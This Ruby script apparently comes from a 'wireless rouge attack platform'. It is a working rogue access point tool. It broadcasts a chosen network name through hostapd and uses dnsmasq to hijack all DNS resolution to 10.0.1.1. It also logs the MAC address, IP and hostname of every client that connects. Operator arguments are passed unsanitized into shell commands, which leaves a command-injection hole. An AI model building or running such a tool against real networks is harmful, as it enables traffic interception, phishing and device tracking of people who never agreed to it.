require_relative("libs/decoder")
require("socket")
require("json")

Log = Log4Bot.new("%H:%M:%S")
Codec = Decoder.new

Log.Logo
# If Argv[0] is nil, then return an error
if ARGV[0].nil?
  puts("The wireless rouge attack platform")
  puts("Usage: ruby #{__FILE__} <interface> <essid> <channel> <password (optional)>")
  exit 1
end

# Minimum of 3 args
if ARGV.length < 3
  Log.error("Usage: ruby main.rb <interface> <essid> <channel> <password (optional)> <eth-backport true/false (default: true)>")
  exit
end

Interface = ARGV[0]
Essid = ARGV[1]
Channel = ARGV[2]
Password = ARGV[3]
DnsConf = "/tmp/#{Random.rand(1000..9999)}_dns.conf"
HostapdConf = "/tmp/#{Random.rand(1000..9999)}_hostapd.conf"
DhcpLog = "/tmp/#{Random.rand(1000..9999)}_dhcp.log"
HostapdLog = "/tmp/#{Random.rand(1000..9999)}_hostapd.log"
hostLog = nil
dhcpLog = nil
hostThread = nil
dhcpThread = nil
lastestDns = ""
lastestHost = ""

# Set EthBackport to true by default, otherwise set it to what the user wants
EthBackport = if ARGV[4].nil?
    true
  else
    ARGV[4]
  end

# Well check if the interface exist's.
if File.exist?("/sys/class/net/#{Interface}")
  Log.info("Found #{Interface}")
else
  Log.error("Interface \e[1m#{Interface}\e[0m does not exist")
  exit
end
if Password.nil?
  File.open(HostapdConf, "w") do |f|
    f.puts("interface=#{Interface}")
    f.puts("driver=nl80211")
    f.puts("ssid=#{Essid}")
    f.puts("channel=#{Channel}")
    f.puts("hw_mode=g")
    # f.puts('macaddr_acl=0')
    f.puts("ignore_broadcast_ssid=0")
  end
else
  Log.warn("Network(\e[1m#{Essid}\e[0m) -> Password(\e[1m#{Password}\e[0m)")
  File.open(HostapdConf, "w") do |f|
    f.puts("interface=#{Interface}")
    f.puts("driver=nl80211")
    f.puts("ssid=#{Essid}")
    f.puts("channel=#{Channel}")
    f.puts("hw_mode=g")
    f.puts("macaddr_acl=0")
    f.puts("ignore_broadcast_ssid=0")
    f.puts("auth_algs=1")
    f.puts("wpa=2")
    f.puts("wpa_passphrase=#{Password}")
    f.puts("wpa_key_mgmt=WPA-PSK")
    f.puts("wpa_pairwise=TKIP")
    f.puts("rsn_pairwise=CCMP")
  end
end
File.open(DnsConf, "w") do |f|
  f.puts("interface=#{Interface}")
  f.puts("dhcp-authoritative")
  f.puts("log-dhcp")
  f.puts("log-facility=#{DhcpLog}")
  f.puts("bind-interfaces")
  f.puts("bogus-priv")
  f.puts("dhcp-range=10.0.1.2,10.0.1.16,1h")
  f.puts("address=/#/10.0.1.1")
end

if system("ifconfig #{Interface} 10.0.1.1 netmask 255.255.255.0 2> /dev/null")
  Log.info("Set IP address on \e[1m#{Interface}\e[0m -> \e[1m10.0.1.1\e[0m")
else
  Log.error("Failed to set IP address on #{Interface}")
  exit 1
end
if system("iwconfig #{Interface} mode managed 2> /dev/null")
  Log.info("Set \e[1m#{Interface}\e[0m to managed mode")
else
  Log.error("Failed to set \e[1m#{Interface}\e[0m to managed mode")
  exit 1
end

hostThread = Thread.new do
  File.new(HostapdLog, "w", 0o644)
  if system("hostapd #{HostapdConf} > #{HostapdLog} 2>&1")
    Log.info("Started hostapd on \e[1m#{Interface}\e[0m")
  else
    Log.error("Failed to start hostapd on \e[1m#{Interface}\e[0m")
    exit 1
  end
end
dhcpThread = Thread.new do
  File.new(DhcpLog, "w", 0o644)
  if system("dnsmasq -C #{DnsConf} -k")
    Log.info("Started dnsmasq on \e[1m#{Interface}\e[0m")
  else
    Log.error("Failed to start dnsmasq on \e[1m#{Interface}\e[0m")
    exit 1
  end
end

fails = 0
LogThread = Thread.start do
  loop do
    if hostLog.nil? || dhcpLog.nil?
      begin
        hostLog = File.open(HostapdLog, "r")
        dhcpLog = File.open(DhcpLog, "r")
        Log.info("Hooked into \e[1m#{HostapdLog}\e[0m and \e[1m#{DhcpLog}\e[0m")
      rescue Exception => e
        fails += 1
        sleep 0.5
        if fails > 5
          Log.error("Failed to open log files: #{e}")
          exit 1
        end
        retry
      end
    end
    lastestDns = dhcpLog.read
    lastestHost = hostLog.read
    unless lastestDns.nil?
      lastestDns.chomp!
      if lastestDns.include?("DHCPACK")
        data = lastestDns.split(" ")
        ip = data[6]
        mac = data[7]
        hostname = if data[8].nil?
            "unknown"
          else
            data[8]
          end
        Log.info("Assigned IP: \e[1m#{ip}\e[0m to \e[1m#{mac}\e[0m (#{hostname})")
      end
    end
    unless lastestHost.nil?
      lastestHost.chomp!
      if lastestHost.include?("AP-STA-CONNECTED")
        data = lastestHost.split(" ")
        mac = data[2]
        Log.info("Client \e[1m#{mac}\e[0m connected")
      elsif lastestHost.include?("AP-STA-DISCONNECTED")
        data = lastestHost.split(" ")
        mac = data[2]
        Log.info("Client \e[1m#{mac}\e[0m disconnected")
      end
    end
  end
end

trap("INT") do
  Log.warn("Caught SIGINT, stopping...")
  system("killall hostapd dnsmasq")
  hostThread.kill
  dhcpThread.kill
  Process.kill("SIGKILL", Process.pid)
  exit
end
trap("EXIT") do
  Log.warn("Caught SIGEXIT, stopping...")
  system("killall hostapd dnsmasq")
  # Delete the files
  system("rm #{HostapdLog} #{DhcpLog} #{HostapdConf} #{DnsConf}")
  hostThread.kill
  dhcpThread.kill
  Process.kill("SIGKILL", Process.pid)
  exit
end

Log.info("Starting hostapd on \e[1m#{Interface}\e[0m")
Log.info("Starting dnsmasq on \e[1m#{Interface}\e[0m")
Log.info("Press Ctrl+C to stop")
# start the logger thread
LogThread.join
